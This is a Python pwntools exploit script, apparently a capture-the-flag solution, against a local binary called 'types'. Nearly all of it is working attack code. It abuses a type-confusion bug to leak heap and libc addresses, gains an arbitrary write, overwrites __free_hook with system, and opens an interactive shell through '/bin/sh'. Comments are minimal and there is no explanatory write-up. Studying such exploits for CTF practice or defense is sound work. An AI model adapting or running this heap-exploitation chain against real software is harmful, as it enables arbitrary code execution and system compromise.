from pwn import *

TYPE_INT        = 1
TYPE_FLOAT      = 2
TYPE_STR     = 3

TYPE_INIT       = 1
TYPE_DEL        = 2

r = process("./types")

def addType(_type, val):
    r.sendline("1")
    print r.recvuntil(">>> ")
    r.sendline(str(_type))
    print r.recvuntil("Input : ")
    r.sendline(str(val))
    print r.recvuntil(">>> ")
    r.sendline("4")
    print r.recvuntil(">>> ")

def viewType(idx):
    r.sendline("2")
    print r.recvuntil("index : ")
    r.sendline(str(idx))
    print r.recvuntil("value : ")
    rv = r.recvuntil("\n")[:-1]
    print r.recvuntil(">>> ")
    return rv

def editType(idx, val):
    r.sendline("3")
    print r.recvuntil("index : ")
    r.sendline(str(idx))
    print r.recvuntil("Input : ")
    r.sendline(str(val))
    print r.recvuntil(">>> ")

def delType(idx, flag):
    r.sendline("4")
    print r.recvuntil("index : ")
    r.sendline(str(idx))
    print r.recvuntil(">>> ")
    r.sendline(str(flag))
    print r.recvuntil(">>> ")

print r.recvuntil(">>> ")

addType(TYPE_INT, 10)
addType(TYPE_STR, "A"*0x100)
addType(TYPE_STR, "B"*0x20)

delType(1, TYPE_INIT)                       # type none

heap = int(viewType(1))                     # assign int
heap_base = heap - 0x12070
ptr = heap_base + 0x11d80
unsorted = heap_base + 0x11de0

editType(1, ptr)                            # modify ptr
delType(1, TYPE_INIT)                       # type none, ptr uninitialized
editType(1, p64(unsorted) + "\x10\x00")     # assign string, arbirary write

libc = u64(viewType(2)[:8])
libc_base = libc - 0x3c4b78
free_hook = libc_base + 0x3c67a8
system = libc_base + 0x45390

delType(1, TYPE_INIT)                       # type none
viewType(1)                                 # assign int
editType(1, free_hook)                      # ptr -> free_hook
delType(1, TYPE_INIT)                       # type none
editType(1, p64(system))                    # assign string, free_hook -> system

r.sendline("1")
r.sendline("3")
r.sendline("/bin/sh;"*100)                  # system("/bin/sh")

r.interactive()
